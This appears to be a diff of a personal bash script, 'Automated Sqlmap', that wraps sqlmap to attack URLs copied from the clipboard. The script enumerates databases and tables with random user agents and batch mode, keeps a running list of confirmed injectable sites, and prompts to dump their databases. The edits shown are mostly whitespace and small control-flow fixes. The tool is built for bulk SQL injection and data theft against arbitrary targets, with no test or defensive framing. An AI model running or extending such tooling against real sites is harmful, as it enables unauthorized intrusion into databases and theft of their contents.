@@ -1,11 +1,11 @@
-#!/bin/bash 
+#!/bin/bash
 #Automated Sqlmap#
 
 if command -v fsql >/dev/null 2>&1
  then
 sleep 0
 else
-echo "#!/bin/bash 
+echo "#!/bin/bash
 #Automated Sqlmap#
 lsql --fast" > /bin/fsql
 chmod +x /bin/fsql
@@ -14,6 +14,8 @@ echo "Added fsql command!"
 tput rmso;
 sleep 2
 fi
+
+
 
 if command -v unbuffer >/dev/null 2>&1
  then
@@ -47,7 +49,7 @@ echo "Use "lsql --fast" or "fsql" to start with copied url and default settings.
 echo
 echo "Confirmed injections can be found in either: ~/.lsql.vul (including timestamp) and ~/lsql.list (plain)."
 echo "Use "lsql --list" to show all confirmed url's."
-echo 
+echo
 echo "Made for private use by Inbell1s."
 echo
 tput sgr0
@@ -55,8 +57,9 @@ tput sgr0
 if [ "$1" == --list ]; then
 	tput smso;
 echo "Confirmed Url's:"
-	tput rmso;	
-cat ~/.lsql.vul
+	tput rmso;
+cat -n ~/.lsql.vul
+exit 0
 elif [ "$1" == --fast ]; then
 url=$(xclip -selection c -o)
 Threads="3"
@@ -75,7 +78,7 @@ while true; do
 			if [ -z "$url" ]; then
                 		url=$(xclip -selection c -o)
 		        fi
-
+    break
 	else
 		echo
 		tput smso;
@@ -84,7 +87,6 @@ while true; do
 		break
 	fi
 done
-
 else
 
 
@@ -130,7 +132,7 @@ read -r Threads
 	if [ -z "$Threads" ]; then
 		Threads=3
 		tput smso;
-  echo "Starting with 3 Threads." 
+  echo "Starting with 3 Threads."
 tput rmso;
 
 	fi
@@ -140,7 +142,7 @@ read -r extra
 
 fi
 
-unbuffer sqlmap --random-agent --batch --threads "$Threads" --dbs -u "$url" $extra | tee lsql.log 
+unbuffer sqlmap --random-agent --batch --threads "$Threads" --dbs -u "$url" $extra | tee lsql.log
 
 echo
 echo
@@ -158,11 +160,11 @@ now=$(date)
 	tput smso;
 	echo "Previously added url!"
 	else
+    echo "$url - $now" >> ~/.lsql.vul
+    echo "$url" >> ~/lsql.list
 	echo "Added to log!"
 	tput rmso;
 fi
-echo "$url - $now" >> ~/.lsql.vul
-echo "$url" >> ~/lsql.list
 tput smso;
 echo
 echo
@@ -172,7 +174,7 @@ echo "sqlmap --random-agent -o --batch --no-cast --exclude-sysdb --tables -u '"$
 echo
 echo
 sqlmap --random-agent -o --batch --no-cast --exclude-sysdb --tables -u ""$url""
-else 
+else
 echo
 echo "$url" >> ~/lsql.no
 tput smso;
@@ -183,7 +185,7 @@ fi
 
 ##Dump option##
 if grep -q "$url" ~/.lsql.vul; then
-	
+
 while true; do
     read -p "Do you wish to dump the database?: Y/n)" yn
 	case $yn in
